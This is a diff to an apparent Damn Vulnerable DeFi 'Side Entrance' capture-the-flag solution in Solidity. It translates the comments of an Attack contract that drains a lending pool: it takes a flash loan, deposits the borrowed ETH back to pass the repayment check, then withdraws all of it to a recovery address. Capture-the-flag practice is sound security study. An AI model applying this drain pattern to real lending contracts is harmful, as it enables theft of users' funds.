@@ -61,26 +61,26 @@ contract SideEntranceChallenge is Test {
 
 contract Attack {
 
-    //声明合约
+    // Declare target pool contract
     SideEntranceLenderPool pool;
 
-    //初始化SideEntranceLenderPool合约
+    // Initialize SideEntranceLenderPool instance
     constructor(address _pool) {
         pool = SideEntranceLenderPool(_pool);
     }
 
     function attack(uint256 ETHER_IN_POOL, address recovery) external {
-        pool.flashLoan(ETHER_IN_POOL);//借贷 1000 WTH
-        pool.withdraw();//提取存入的全部 1000 WTH
-        payable(recovery).transfer(address(this).balance);//把全部的 1000 WTH转账给recovery
+        pool.flashLoan(ETHER_IN_POOL);// Borrow all funds via flash loan
+        pool.withdraw();// Withdraw all credited funds
+        payable(recovery).transfer(address(this).balance);// Transfer all stolen funds to recovery account
     }
 
-    //实现回调函数并以攻击者的名义调用deposit，把闪电贷借出的 1000 ETH存入pool合约
+    // Callback function: deposit borrowed funds under attacker's identity to bypass repayment check
     function execute() external payable {
         pool.deposit{value: msg.value}();
     }
 
-    //回调函数收钱
+    // Receive ETH from pool.withdraw()
     receive() external payable {}
 
 }
